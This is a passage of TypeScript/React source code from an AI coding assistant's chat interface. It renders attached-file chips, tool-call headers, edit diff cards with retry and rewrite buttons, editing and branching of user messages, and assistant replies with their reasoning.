				.filter(uri => !selections.find(s => s.type === 'File' && s.uri.fsPath === uri.fsPath))
				.slice(0, maxProspectiveFiles)

			const answer: StagingSelectionItem[] = []
			for (const uri of prospectiveURIs) {
				answer.push({
					type: 'File',
					uri: uri,
					language: (await modelReferenceService.getModelSafe(uri)).model?.getLanguageId() || 'plaintext',
					state: { wasAddedAsCurrentFile: false },
				})
			}
			return answer
		}

		// add a prospective file if type === 'staging' and if the user is in a file, and if the file is not selected yet
		if (type === 'staging' && showProspectiveSelections) {
			computeRecents().then((a) => setProspectiveSelections(a))
		}
		else {
			setProspectiveSelections([])
		}
	}, [recentUris, selections, type, showProspectiveSelections])


	const allSelections = [...selections, ...prospectiveSelections]

	if (allSelections.length === 0) {
		return null
	}

	if (type === 'past') {
		return <div className='flex flex-wrap items-center gap-x-3.5 gap-y-0.5 mt-1.5 font-mono text-[12px] text-vader-fg-2 select-none' data-testid='vader-user-files'>
			{allSelections.map((selection, i) => <button key={i} type='button' className='underline decoration-dotted underline-offset-[3px] hover:text-vader-fg-1 transition-colors duration-150 cursor-pointer'
				data-tooltip-id='vader-tooltip' data-tooltip-content={getRelative(selection.uri, accessor)} data-tooltip-place='top' data-tooltip-delay-show={1500}
				onClick={e => {
					e.stopPropagation()
					if (selection.type === 'Folder') void accessor.get('ICommandService').executeCommand('revealInExplorer', selection.uri)
					else vaderOpenFileFn(selection.uri, accessor, selection.type === 'CodeSelection' ? selection.range : undefined)
				}}>
				{getBasename(selection.uri.fsPath) + (selection.type === 'CodeSelection' ? ` (${selection.range[0]}-${selection.range[1]})` : '')}
			</button>)}
		</div>
	}

	if (!showProspectiveSelections) return <div className='flex flex-wrap gap-1 min-w-0' data-testid='vader-attached-files'>
		{selections.map((selection, i) => <span key={`${selection.type}:${selection.uri.toString()}:${i}`} data-testid='vader-attached-file' data-file-uri={selection.uri.toString()}
			className='inline-flex items-center min-w-0 max-w-full border border-vader-border-2 rounded-md text-xs text-vader-fg-2'>
			<button type='button' data-testid='vader-attached-file-open' title={selection.uri.fsPath} className='truncate min-w-0 px-2 py-1 hover:text-vader-fg-1' data-i18n-skip
				onClick={e => { e.stopPropagation(); if (selection.type === 'Folder') void commandService.executeCommand('revealInExplorer', selection.uri); else vaderOpenFileFn(selection.uri, accessor, selection.type === 'CodeSelection' ? selection.range : undefined) }}>
				{getBasename(selection.uri.fsPath)}{selection.type === 'CodeSelection' ? ` (${selection.range[0]}-${selection.range[1]})` : ''}
			</button>
			<button type='button' data-testid='vader-attached-file-remove' aria-label='Remove attachment' title='Remove attachment' className='flex-none px-1.5 py-1 hover:text-vader-fg-1'
				onClick={e => { e.stopPropagation(); setSelections(selections.filter((_, index) => index !== i)) }}><span aria-hidden='true'>×</span></button>
		</span>)}
	</div>

	return (
		<div className='flex items-center flex-wrap text-left relative gap-x-0.5 gap-y-1 pb-0.5'>

			{allSelections.map((selection, i) => {

				const isThisSelectionProspective = i > selections.length - 1

				const thisKey = selection.type === 'CodeSelection' ? selection.type + selection.language + selection.range + selection.state.wasAddedAsCurrentFile + selection.uri.fsPath
					: selection.type === 'File' ? selection.type + selection.language + selection.state.wasAddedAsCurrentFile + selection.uri.fsPath
						: selection.type === 'Folder' ? selection.type + selection.language + selection.state + selection.uri.fsPath
							: i

				const SelectionIcon = (
					selection.type === 'File' ? File
						: selection.type === 'Folder' ? Folder
							: selection.type === 'CodeSelection' ? Text
								: (undefined as never)
				)

				return <div // container for summarybox and code
					key={thisKey}
					className={`flex flex-col space-y-[1px]`}
				>
					{/* tooltip for file path */}
					<span className="truncate overflow-hidden text-ellipsis"
						data-tooltip-id='vader-tooltip'
						data-tooltip-content={getRelative(selection.uri, accessor)}
						data-tooltip-place='top'
						data-tooltip-delay-show={3000}
					>
						{/* summarybox */}
						<div
							className={`
								flex items-center gap-1 relative
								px-1
								w-fit h-fit
								select-none
								text-xs text-nowrap
								border rounded-sm
								${isThisSelectionProspective ? 'bg-vader-bg-1 text-vader-fg-3 opacity-80' : 'bg-vader-bg-1 hover:brightness-95 text-vader-fg-1'}
								${isThisSelectionProspective
									? 'border-vader-border-2'
									: 'border-vader-border-1'
								}
								hover:border-vader-border-1
								transition-all duration-150
							`}
							onClick={() => {
								if (type !== 'staging') return; // (never)
								if (isThisSelectionProspective) { // add prospective selection to selections
									setSelections([...selections, selection])
								}
								else if (selection.type === 'File') { // open files
									vaderOpenFileFn(selection.uri, accessor);

									const wasAddedAsCurrentFile = selection.state.wasAddedAsCurrentFile
									if (wasAddedAsCurrentFile) {
										// make it so the file is added permanently, not just as the current file
										const newSelection: StagingSelectionItem = { ...selection, state: { ...selection.state, wasAddedAsCurrentFile: false } }
										setSelections([
											...selections.slice(0, i),
											newSelection,
											...selections.slice(i + 1)
										])
									}
								}
								else if (selection.type === 'CodeSelection') {
									vaderOpenFileFn(selection.uri, accessor, selection.range);
								}
								else if (selection.type === 'Folder') {
									void accessor.get('ICommandService').executeCommand('revealInExplorer', selection.uri) // shows the folder in the Explorer
								}
							}}
						>
							{<SelectionIcon size={10} />}

							{ // file name and range
								getBasename(selection.uri.fsPath)
								+ (selection.type === 'CodeSelection' ? ` (${selection.range[0]}-${selection.range[1]})` : '')
							}

							{selection.type === 'File' && selection.state.wasAddedAsCurrentFile && messageIdx === undefined && currentURI?.fsPath === selection.uri.fsPath ?
								<span className={`text-[8px] 'vader-opacity-60 text-vader-fg-4`}>
									{`(Current File)`}
								</span>
								: null
							}

							{type === 'staging' && !isThisSelectionProspective ? // X button
								<div // box for making it easier to click
									className='cursor-pointer z-1 self-stretch flex items-center justify-center'
									onClick={(e) => {
										e.stopPropagation(); // don't open/close selection
										if (type !== 'staging') return;
										setSelections([...selections.slice(0, i), ...selections.slice(i + 1)])
									}}
								>
									<IconX
										className='stroke-[2]'
										size={10}
									/>
								</div>
								: <></>
							}
						</div>
					</span>
				</div>

			})}


		</div>

	)
}


type ToolHeaderParams = {
	icon?: React.ReactNode;
	title: React.ReactNode;
	desc1: React.ReactNode;
	desc1OnClick?: () => void;
	desc2?: React.ReactNode;
	isError?: boolean;
	info?: string;
	desc1Info?: string;
	isRejected?: boolean;
	numResults?: number;
	hasNextPage?: boolean;
	children?: React.ReactNode;
	bottomChildren?: React.ReactNode;
	onClick?: () => void;
	desc2OnClick?: () => void;
	isOpen?: boolean;
	className?: string;
}

const ToolHeaderWrapper = ({
	icon,
	title,
	desc1,
	desc1OnClick,
	desc1Info,
	desc2,
	numResults,
	hasNextPage,
	children,
	info,
	bottomChildren,
	isError,
	onClick,
	desc2OnClick,
	isOpen,
	isRejected,
	className, // applies to the main content
}: ToolHeaderParams) => {

	const [isOpen_, setIsOpen] = useState(false);
	const isExpanded = isOpen !== undefined ? isOpen : isOpen_

	const isDropdown = children !== undefined // null ALLOWS dropdown
	const isClickable = !!(isDropdown || onClick)

	const isDesc1Clickable = !!desc1OnClick

	const desc1HTML = <span
		className={`text-vader-fg-2 text-[12.5px] font-mono truncate ml-2
			${isDesc1Clickable ? 'cursor-pointer hover:brightness-125 transition-all duration-150' : ''}
		`}
		onClick={desc1OnClick}
		{...desc1Info ? {
			'data-tooltip-id': 'vader-tooltip',
			'data-tooltip-content': desc1Info,
			'data-tooltip-place': 'top',
			'data-tooltip-delay-show': 1000,
		} : {}}
	>{desc1}</span>

	return (<div className='' data-testid='vader-tool'>
		<div className={`w-full rounded px-1 py-0.5 overflow-hidden ${className}`}>
			{/* header */}
			<div className={`select-none flex items-center min-h-[24px]`}>
				<div className={`flex items-center w-full gap-x-2 overflow-hidden justify-between ${isRejected ? 'line-through' : ''}`}>
					{/* left */}
					<div // container for if desc1 is clickable
						className='ml-1 flex items-center overflow-hidden'
					>
						{/* title eg "> Edited File" */}
						<div className={`
							flex items-center min-w-0 overflow-hidden grow
							${isClickable ? 'cursor-pointer hover:brightness-125 transition-all duration-150' : ''}
						`}
							onClick={() => {
								if (isDropdown) { setIsOpen(v => !v); }
								if (onClick) { onClick(); }
							}}
						>
							{isDropdown && (<ChevronRight
								className={`
								text-vader-fg-3 mr-0.5 h-4 w-4 flex-shrink-0 transition-transform duration-100 ease-[cubic-bezier(0.4,0,0.2,1)]
								${isExpanded ? 'rotate-90' : ''}
							`}
							/>)}
							<span className="text-vader-fg-3 flex-shrink-0">{title}</span>

							{!isDesc1Clickable && desc1HTML}
						</div>
						{isDesc1Clickable && desc1HTML}
					</div>

					{/* right */}
					<div className="flex items-center gap-x-2 flex-shrink-0">

						{info && <CircleEllipsis
							className='ml-2 text-vader-fg-4 opacity-60 flex-shrink-0'
							size={14}
							data-tooltip-id='vader-tooltip'
							data-tooltip-content={info}
							data-tooltip-place='top-end'
						/>}

						{isError && <AlertTriangle
							className='text-vader-warning opacity-90 flex-shrink-0'
							size={14}
							data-tooltip-id='vader-tooltip'
							data-tooltip-content={'Error running tool'}
							data-tooltip-place='top'
						/>}
						{isRejected && <Ban
							className='text-vader-fg-4 opacity-90 flex-shrink-0'
							size={14}
							data-tooltip-id='vader-tooltip'
							data-tooltip-content={'Canceled'}
							data-tooltip-place='top'
						/>}
						{desc2 && <span className="text-vader-fg-4 text-xs" onClick={desc2OnClick}>
							{desc2}
						</span>}
						{numResults !== undefined && (
							<span className="text-vader-fg-4 text-xs ml-auto mr-1">
								{`${numResults}${hasNextPage ? '+' : ''} result${numResults !== 1 ? 's' : ''}`}
							</span>
						)}
					</div>
				</div>
			</div>
			{/* children */}
			{<div
				className={`overflow-hidden transition-all duration-200 ease-in-out ${isExpanded ? 'opacity-100 py-1 mt-1 rounded-md border border-vader-border-3 bg-vader-bg-3' : 'max-h-0 opacity-0'}
					text-vader-fg-4 overflow-x-auto
				  `}
			//    bg-black bg-opacity-10 border border-vader-border-4 border-opacity-50
			>
				{children}
			</div>}
		</div>
		{bottomChildren}
	</div>);
};



const SHOWN_DIFF_LINES = 16
/** the change an edit made, as one block of the conversation: path, +n -n, Reject / Accept while they are open, and the lines; long ones show their first lines */
const EditCard = ({ toolMessage, threadId, messageIdx, content }: Parameters<ResultWrapper<'edit_file' | 'rewrite_file'>>[0] & { content: string }) => {
	const accessor = useAccessor()
	const { params, name } = toolMessage
	const rejected = toolMessage.type === 'rejected'
	const [open, setOpen] = useState(true)
	const [all, setAll] = useState(false)
	let rel = params.uri.fsPath
	try { rel = getRelative(params.uri, accessor) ?? rel } catch { /* no workspace: the whole path */ }
	rel = rel.replace(/\\/g, '/').replace(/^\/+/, '')
	const counts = name === 'edit_file' ? countsOfBlocks(content) : { added: content ? content.split('\n').length : 0, removed: 0 }
	const applyBoxId = getApplyBoxId({ threadId, messageIdx, tokenIdx: 'N/A' })
	const lines = content.split('\n').length
	const tooLong = lines > SHOWN_DIFF_LINES && !all
	return <div data-testid='vader-tool' data-kind='edit' className={`flex flex-col ${rejected ? 'opacity-70' : ''}`}>
		<div className='flex items-center gap-2.5 h-[34px] border-t border-vader-border-3'>
			<button type='button' aria-expanded={open} aria-label={open ? 'Hide the change' : 'Show the change'} data-testid='vader-edit-toggle' onClick={() => setOpen(o => !o)} className='flex items-center justify-center w-4 h-4 text-vader-fg-3 hover:text-vader-fg-1 flex-shrink-0'>
				<ChevronRight className={`h-3 w-3 transition-transform duration-100 ${open ? 'rotate-90' : ''}`} />
			</button>
			<button type='button' data-testid='vader-edit-path' title={rel} onClick={() => vaderOpenFileFn(params.uri, accessor)} className={`flex-1 min-w-0 truncate text-left font-mono text-[12px] text-vader-fg-2 hover:text-vader-fg-1 ${rejected ? 'line-through' : ''}`}>{rel}</button>
			<span className='text-[12.5px]' style={{ color: '#8fd7ac' }} data-testid='vader-edit-added'>+{counts.added}</span>
			{counts.removed > 0 ? <span className='text-[12.5px]' style={{ color: '#f1a1a4' }} data-testid='vader-edit-removed'>{'\u2212'}{counts.removed}</span> : null}
			{rejected ? <span className='text-vader-fg-3 text-xs'>Not applied</span> : <EditToolHeaderButtons applyBoxId={applyBoxId} uri={params.uri} codeStr={content} toolName={name} threadId={threadId} />}
		</div>
		{open ? <div className='overflow-x-auto border-b border-vader-border-3 select-text cursor-auto'>
			<div style={tooLong ? { maxHeight: SHOWN_DIFF_LINES * 20 + 8, overflow: 'hidden' } : undefined}>
				{name === 'edit_file' ? <EditDiffLines uri={params.uri} searchReplaceBlocks={content} /> : <EditToolChildren uri={params.uri} code={content} type='rewrite' />}
			</div>
			{lines > SHOWN_DIFF_LINES ? <button type='button' data-testid='vader-edit-more' onClick={() => setAll(a => !a)} className='w-full text-left px-3 py-1 text-xs text-vader-fg-3 hover:text-vader-fg-1'>{all ? 'Show fewer lines' : `Show all ${lines} lines`}</button> : null}
		</div> : null}
		{(toolMessage.type === 'success' || toolMessage.type === 'rejected') && (toolMessage.result?.lintErrors?.length ?? 0) > 0 ? <BottomChildren title='Lint errors'>
			{toolMessage.result?.lintErrors?.map((error, i) => (
				<div key={i} className='whitespace-nowrap'>Lines {error.startLineNumber}-{error.endLineNumber}: {error.message}</div>
			))}
		</BottomChildren> : null}
	</div>
}

const EditTool = ({ toolMessage, threadId, messageIdx, content }: Parameters<ResultWrapper<'edit_file' | 'rewrite_file'>>[0] & { content: string }) => {
	const accessor = useAccessor()
	const runningHere = !!useChatThreadsStreamState(threadId)?.isRunning
	const isError = false
	const isRejected = toolMessage.type === 'rejected'

	const title = getTitle(toolMessage)

	const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
	const icon = null

	const { rawParams, params, name } = toolMessage
	const desc1OnClick = () => vaderOpenFileFn(params.uri, accessor)
	const componentParams: ToolHeaderParams = { title, desc1, desc1OnClick, desc1Info, isError, icon, isRejected, }


	const editToolType = toolMessage.name === 'edit_file' ? 'diff' : 'rewrite'
	if (toolMessage.type === 'success' || toolMessage.type === 'rejected') return <EditCard toolMessage={toolMessage} threadId={threadId} messageIdx={messageIdx} content={content} />
	if (toolMessage.type === 'running_now' || toolMessage.type === 'tool_request') {
		componentParams.children = <ToolChildrenWrapper className='bg-vader-bg-3'>
			<EditToolChildren
				uri={params.uri}
				code={content}
				type={editToolType}
			/>
		</ToolChildrenWrapper>
		// JumpToFileButton removed in favor of FileLinkText
	}
	else if (toolMessage.type === 'tool_error') {
		// the edit that was tried, folded, and what went wrong
		componentParams.children = <ToolChildrenWrapper className='bg-vader-bg-3'>
			<EditToolChildren
				uri={params.uri}
				code={content}
				type={editToolType}
			/>
		</ToolChildrenWrapper>
		const { result } = toolMessage
		// an edit that did not fit says which part did not and that nothing was written, with the two ways on (board S08); the real message is under it
		const words = explainEditError(String(result ?? ''))
		const fileName = getBasename(params.uri.fsPath)
		componentParams.bottomChildren = <>
			{words ? <div className='flex flex-col gap-2 px-3 py-2.5 mt-1 rounded-lg border border-vader-border-2 bg-vader-bg-1' data-testid='vader-edit-error'>
				<span className='font-semibold text-vader-fg-1'>{words.title}</span>
				<span className='text-vader-fg-2 leading-relaxed'>{words.text}</span>
				{!runningHere && name === 'edit_file' ? <div className='flex gap-2'>
					<button type='button' data-testid='vader-edit-again' className='px-3 py-1 rounded-md bg-vader-fg-0 text-vader-bg-3 hover:opacity-90 text-sm font-medium' onClick={() => { void accessor.get('IAgentGatewayService').startTask({ userMessage: TRY_AGAIN_MESSAGE, threadId }) }}>Try again</button>
					<button type='button' data-testid='vader-edit-rewrite' className='px-3 py-1 rounded-md text-sm border border-vader-border-2 text-vader-fg-1 hover:bg-vader-bg-2-hover' onClick={() => { void accessor.get('IAgentGatewayService').startTask({ userMessage: rewriteMessage(fileName), threadId }) }}>Rewrite the whole file</button>
				</div> : null}
			</div> : null}
			<BottomChildren title='Error'>
				<CodeChildren>
					{result}
				</CodeChildren>
			</BottomChildren>
		</>
	}

	return <ToolHeaderWrapper {...componentParams} />
}

const SimplifiedToolHeader = ({
	title,
	children,
}: {
	title: string;
	children?: React.ReactNode;
}) => {
	const [isOpen, setIsOpen] = useState(false);
	const isDropdown = children !== undefined;
	return (
		<div>
			<div className="w-full">
				{/* header */}
				<div
					className={`select-none flex items-center min-h-[24px] ${isDropdown ? 'cursor-pointer' : ''}`}
					onClick={() => {
						if (isDropdown) { setIsOpen(v => !v); }
					}}
				>
					{isDropdown && (
						<ChevronRight
							className={`text-vader-fg-3 mr-0.5 h-4 w-4 flex-shrink-0 transition-transform duration-100 ease-[cubic-bezier(0.4,0,0.2,1)] ${isOpen ? 'rotate-90' : ''}`}
						/>
					)}
					<div className="flex items-center w-full overflow-hidden">
						<span className="text-vader-fg-3">{title}</span>
					</div>
				</div>
				{/* children */}
				{<div
					className={`overflow-hidden transition-all duration-200 ease-in-out ${isOpen ? 'opacity-100' : 'max-h-0 opacity-0'} text-vader-fg-4`}
				>
					{children}
				</div>}
			</div>
		</div>
	);
};




const UserMessageComponent = ({ threadId, chatMessage, messageIdx, isCheckpointGhost, currCheckpointIdx, _scrollToBottom }: { threadId: string, chatMessage: ChatMessage & { role: 'user' }, messageIdx: number, currCheckpointIdx: number | undefined, isCheckpointGhost: boolean, _scrollToBottom: (() => void) | null }) => {

	const accessor = useAccessor()
	const chatThreadsService = accessor.get('IChatThreadService')
	const agentGatewayService = accessor.get('IAgentGatewayService')
	const stream = useChatThreadsStreamState(threadId)
	const saving = useRef(false)
	const mounted = useRef(false)
	const [isSaving, setIsSaving] = useState(false)
	const [editError, setEditError] = useState('')
	const actionsRef = useRef<HTMLDivElement>(null)
	useEffect(() => { mounted.current = true; return () => { mounted.current = false } }, [])

	// global state
	let isBeingEdited = false
	let stagingSelections: StagingSelectionItem[] = []
	let setIsBeingEdited = (_: boolean) => { }
	let setStagingSelections = (_: StagingSelectionItem[]) => { }

	if (messageIdx !== undefined) {
		const _state = chatThreadsService.getCurrentMessageState(messageIdx)
		isBeingEdited = _state.isBeingEdited
		stagingSelections = _state.stagingSelections
		setIsBeingEdited = (v) => { if (chatThreadsService.state.currentThreadId === threadId) chatThreadsService.setCurrentMessageState(messageIdx, { isBeingEdited: v }) }
		setStagingSelections = (s) => { if (chatThreadsService.state.currentThreadId === threadId) chatThreadsService.setCurrentMessageState(messageIdx, { stagingSelections: s }) }
	}


	// local state
	const mode: ChatBubbleMode = isBeingEdited ? 'edit' : 'display'
	const [isDisabled, setIsDisabled] = useState(false)
	const [branchedTo, setBranchedTo] = useState<string | undefined>()
	const [textAreaRefState, setTextAreaRef] = useState<HTMLTextAreaElement | null>(null)
	const textAreaFnsRef = useRef<TextAreaFns | null>(null)
	// initialize on first render, and when edit was just enabled
	const _mustInitialize = useRef(true)
	const _justEnabledEdit = useRef(false)
	useEffect(() => {
		const canInitialize = mode === 'edit' && textAreaRefState
		const shouldInitialize = _justEnabledEdit.current || _mustInitialize.current
		if (canInitialize && shouldInitialize) {
			setStagingSelections(
				(chatMessage.selections || []).map(s => { // quick hack so we dont have to do anything more
					if (s.type === 'File') return { ...s, state: { ...s.state, wasAddedAsCurrentFile: false, } }
					else return s
				})
			)

			if (textAreaFnsRef.current)
				textAreaFnsRef.current.setValue(chatMessage.displayContent || '')

			textAreaRefState.focus();

			_justEnabledEdit.current = false
			_mustInitialize.current = false
		}

	}, [chatMessage, mode, _justEnabledEdit, textAreaRefState, textAreaFnsRef.current, _justEnabledEdit.current, _mustInitialize.current])

	const onOpenEdit = () => {
		if (chatThreadsService.state.currentThreadId !== threadId || chatThreadsService.streamState[threadId]?.isRunning !== undefined || chatThreadsService.streamState[threadId]?.isPreparing || isCheckpointGhost) return
		setEditError('')
		setIsBeingEdited(true)
		chatThreadsService.setCurrentlyFocusedMessageIdx(messageIdx)
		_justEnabledEdit.current = true
	}
	const onCloseEdit = () => {
		if (saving.current || chatThreadsService.state.currentThreadId !== threadId) return
		setIsBeingEdited(false)
		setEditError('')
		chatThreadsService.setCurrentlyFocusedMessageIdx(undefined)
		requestAnimationFrame(() => actionsRef.current?.querySelector<HTMLButtonElement>('[data-testid="vader-edit-message"]')?.focus())
	}


	let chatbubbleContents: React.ReactNode
	if (mode === 'display') {
		chatbubbleContents = <>
			{chatMessage.images && chatMessage.images.length > 0 ? <div className='flex flex-wrap gap-1.5 pb-1.5' data-testid='vader-user-images'>{chatMessage.images.map(i => <img key={i.id} src={dataUrlOf(i)} alt={i.name} title={i.name} className='h-16 max-w-[120px] rounded-md object-cover border border-vader-border-3' />)}</div> : null}
			<span data-testid='vader-user-text'>{chatMessage.displayContent}</span>
			<SelectedFiles type='past' messageIdx={messageIdx} selections={chatMessage.selections || []} />
		</>
	}
	else if (mode === 'edit') {

		const onSubmit = async () => {

			if (isDisabled || saving.current) return;
			if (!textAreaRefState) return;
			if (messageIdx === undefined) return;
			if (chatThreadsService.state.currentThreadId !== threadId || chatThreadsService.state.allThreads[threadId]?.messages[messageIdx] !== chatMessage) { setEditError('This message changed. Try again.'); return }
			if (chatThreadsService.streamState[threadId]?.isRunning !== undefined || chatThreadsService.streamState[threadId]?.isPreparing) { setEditError('Wait for the current reply to finish.'); return }
			const userMessage = textAreaRefState.value
			if (!userMessage.trim() && !chatMessage.images?.length) return
			saving.current = true
			setIsSaving(true); setEditError('')
			try {
				await agentGatewayService.reviseTask({ userMessage, fromMessageIdx: messageIdx, threadId })
				if (mounted.current && chatThreadsService.state.currentThreadId === threadId) {
					setIsBeingEdited(false)
					chatThreadsService.setCurrentlyFocusedMessageIdx(undefined)
					await chatThreadsService.focusCurrentChat()
					requestAnimationFrame(() => { if (mounted.current) _scrollToBottom?.() })
				}
			} catch (e) {
				if (mounted.current) setEditError('The message could not be updated. Your edit is still here. Try again.')
			} finally {
				saving.current = false
				if (mounted.current) setIsSaving(false)
			}
		}

		const onAbort = async () => {
			await agentGatewayService.cancelTask(threadId)
		}

		const onKeyDown = (e: KeyboardEvent<HTMLTextAreaElement>) => {
			if (e.key === 'Escape') {
				e.preventDefault(); e.stopPropagation()
				onCloseEdit()
			}
			if (e.key === 'Enter' && !e.shiftKey && !e.nativeEvent.isComposing) {
				e.preventDefault()
				void onSubmit()
			}
		}

		chatbubbleContents = <fieldset disabled={isSaving} aria-label='Edit your message' className='min-w-0 border-0 p-0 m-0'><VaderChatArea
			featureName='Chat'
			onSubmit={onSubmit}
			onAbort={onAbort}
			isStreaming={false}
			isDisabled={isDisabled || isSaving || stream?.isRunning !== undefined}
			showSelections={true}
			showProspectiveSelections={false}
			selections={stagingSelections}
			setSelections={setStagingSelections}
		>
			<VaderInputBox2
				enableAtToMention
				ref={setTextAreaRef}
				className='min-h-[81px] max-h-[500px] px-0.5'
				placeholder="Edit your message..."
				testId='vader-edit-input'
				onChangeText={(text) => setIsDisabled(!text.trim() && !chatMessage.images?.length)}
				onFocus={() => {
					if (chatThreadsService.state.currentThreadId === threadId) chatThreadsService.setCurrentlyFocusedMessageIdx(messageIdx)
				}}
				onKeyDown={onKeyDown}
				fnsRef={textAreaFnsRef}
				multiline={true}
			/>
		</VaderChatArea></fieldset>
	}

	const isMsgAfterCheckpoint = currCheckpointIdx !== undefined && currCheckpointIdx === messageIdx - 1

	return <div
		// align chatbubble accoridng to role
		className={`
        relative
        ${mode === 'edit' ? 'w-full max-w-full'
				: mode === 'display' ? `self-stretch w-full max-w-full whitespace-pre-wrap` : '' // user words should be pre
			}

        ${isCheckpointGhost && !isMsgAfterCheckpoint ? 'opacity-50 pointer-events-none' : ''}
    `}
	>
		<div
			// style chatbubble according to role
			className={`
            text-left rounded-lg max-w-full
            ${mode === 'edit' ? ''
						: mode === 'display' ? 'px-3.5 py-[11px] flex flex-col bg-vader-bg-1 text-vader-fg-1 text-[14px] leading-[1.65] overflow-x-auto' : ''
				}
        `}
		>
			{chatbubbleContents}
		</div>



		{mode === 'edit' ? <div
			className="absolute -top-1 -right-1 translate-x-0 -translate-y-0 z-1"
		// data-tooltip-id='vader-tooltip'
		// data-tooltip-content='Edit message'
		// data-tooltip-place='left'
		>
			<button type='button' aria-label='Cancel editing' title='Cancel editing' data-testid='vader-edit-cancel' disabled={isSaving} className='inline-flex h-7 w-7 items-center justify-center rounded-md bg-vader-bg-1 text-vader-fg-2 disabled:opacity-40' onClick={onCloseEdit}><X size={14} aria-hidden='true' /></button>
		</div> : null}
		{editError ? <div role='alert' data-testid='vader-edit-error' className='py-1 text-xs text-vader-fg-2'>{editError}</div> : null}



		{/* the skills this message used and why (board S13): what was put in front of the model, nothing more */}
		{mode === 'display' && (chatMessage.skillsUsed?.length ?? 0) > 0 ? <div className='flex flex-col gap-0.5 px-1 pt-1.5 text-xs text-vader-fg-3' data-testid='vader-skills-used' title={SKILLS_FOOTNOTE}>
			{chatMessage.skillsUsed!.map(u => <div key={u.id} className='flex items-baseline gap-2'><span data-testid='vader-skill-used-line'>Used the skill <code className='font-mono text-vader-fg-1'>{u.name}</code></span>{u.reason ? <span className='flex-1 text-right truncate' data-testid='vader-skill-used-reason'>{u.reason}</span> : null}</div>)}
		</div> : null}

		{/* looking back: a copy of the chat from before this message, to try another way; the original stays as it is */}
		{mode === 'display' && messageIdx !== undefined && !isCheckpointGhost ? <div ref={actionsRef} className='flex items-center gap-3 px-1 pt-1 text-xs text-vader-fg-3 select-none'>
			<MessageActions key={`${threadId}:${messageIdx}`} threadId={threadId} messageIdx={messageIdx} message={chatMessage} role='user' onEdit={onOpenEdit} onBranch={setBranchedTo} />
		</div> : null}
		{branchedTo ? <div className='mt-2 rounded-xl border border-vader-border-2 bg-vader-bg-1 px-4 py-3 flex flex-col gap-2' data-testid='vader-branched'>
			<div className='font-semibold text-vader-fg-1'>Branched here</div>
			<div className='text-vader-fg-2 leading-relaxed'>A new chat started with everything before this message. This chat is unchanged.</div>
			<div className='flex gap-2'>
				<button data-testid='vader-branched-open' className='px-3 py-1 rounded-md bg-vader-fg-0 text-vader-bg-3 hover:opacity-90 text-sm font-medium' onClick={() => { chatThreadsService.switchToThread(branchedTo); setBranchedTo(undefined) }}>Open the new chat</button>
				<button data-testid='vader-branched-stay' className='px-2 py-1 text-vader-fg-2 hover:text-vader-fg-1 text-sm' onClick={() => setBranchedTo(undefined)}>Stay here</button>
			</div>
		</div> : null}
	</div>

}

const SmallProseWrapper = ({ children }: { children: React.ReactNode }) => {
	return <div className='
text-vader-fg-4
prose
prose-sm
break-words
max-w-none
leading-snug
text-[13px]

[&>:first-child]:!mt-0
[&>:last-child]:!mb-0

prose-h1:text-[14px]
prose-h1:my-4

prose-h2:text-[13px]
prose-h2:my-4

prose-h3:text-[13px]
prose-h3:my-3

prose-h4:text-[13px]
prose-h4:my-2

prose-p:my-2
prose-p:leading-snug
prose-hr:my-2

prose-ul:my-2
prose-ul:pl-4
prose-ul:list-outside
prose-ul:list-disc
prose-ul:leading-snug


prose-ol:my-2
prose-ol:pl-4
prose-ol:list-outside
prose-ol:list-decimal
prose-ol:leading-snug

marker:text-inherit

prose-blockquote:pl-2
prose-blockquote:my-2

prose-code:text-vader-fg-3
prose-code:text-[12px]
prose-code:before:content-none
prose-code:after:content-none

prose-pre:text-[12px]
prose-pre:p-2
prose-pre:my-2

prose-table:text-[13px]
'>
		{children}
	</div>
}

const ProseWrapper = ({ children }: { children: React.ReactNode }) => {
	return <div style={{ userSelect: 'text', cursor: 'text' }} className='
text-vader-fg-1
text-[14px]
prose
prose-sm
break-words
prose-p:block
prose-hr:my-4
prose-pre:my-2
marker:text-inherit
prose-ol:list-outside
prose-ol:list-decimal
prose-ul:list-outside
prose-ul:list-disc
prose-li:my-0
prose-code:before:content-none
prose-code:after:content-none
prose-headings:prose-sm
prose-headings:font-bold

prose-p:leading-[1.7]
prose-ol:leading-[1.7]
prose-ul:leading-[1.7]
prose-p:max-w-[80ch]
prose-ol:max-w-[80ch]
prose-ul:max-w-[80ch]

max-w-none
'
	>
		{children}
	</div>
}
const AssistantMessageComponent = ({ threadId, chatMessage, isCheckpointGhost, isCommitted, messageIdx }: { threadId: string, chatMessage: ChatMessage & { role: 'assistant' }, isCheckpointGhost: boolean, messageIdx: number, isCommitted: boolean }) => {

	const accessor = useAccessor()
	const chatThreadsService = accessor.get('IChatThreadService')
	const [branchedTo, setBranchedTo] = useState<string | undefined>()

	const reasoningStr = chatMessage.reasoning?.trim() || null
	const hasReasoning = !!reasoningStr
	const isDoneReasoning = !!chatMessage.displayContent


	const chatMessageLocation: ChatMessageLocation = {
		threadId,
		messageIdx: messageIdx,
	}

	const isEmpty = !chatMessage.displayContent && !chatMessage.reasoning
	if (isEmpty) return null

	return <>
		{/* reasoning token */}
		{hasReasoning &&
			<div className={`${isCheckpointGhost ? 'opacity-50' : ''}`}>
				<ReasoningWrapper isDoneReasoning={isDoneReasoning} isStreaming={!isCommitted}>
					<SmallProseWrapper>
						<ChatMarkdownRender
							string={reasoningStr}
							chatMessageLocation={chatMessageLocation}
							isApplyEnabled={false}
							isLinkDetectionEnabled={true}
						/>
					</SmallProseWrapper>
				</ReasoningWrapper>
			</div>
		}

		{/* assistant message */}
		{chatMessage.displayContent &&
			<div className={`group ${isCheckpointGhost ? 'opacity-50' : ''}`} data-testid='vader-assistant-text'>
				<ProseWrapper>
					<ChatMarkdownRender
						string={chatMessage.displayContent || ''}
						chatMessageLocation={chatMessageLocation}
						isApplyEnabled={true}
						isLinkDetectionEnabled={true}
					/>
				</ProseWrapper>
				{isCommitted && !isCheckpointGhost ? <div className='pt-1 text-xs text-vader-fg-3 select-none'>
					<MessageActions key={`${threadId}:${messageIdx}`} threadId={threadId} messageIdx={messageIdx} message={chatMessage} role='assistant' onBranch={setBranchedTo} />
					{branchedTo ? <div className='flex items-center gap-3 py-2' data-testid='vader-answer-branched'><span>Branched here</span><button type='button' className='underline' data-testid='vader-answer-branch-open' onClick={() => { chatThreadsService.switchToThread(branchedTo); setBranchedTo(undefined) }}>Open the new chat</button><button type='button' data-testid='vader-answer-branch-stay' onClick={() => setBranchedTo(undefined)}>Stay here</button></div> : null}
				</div> : null}
			</div>
		}
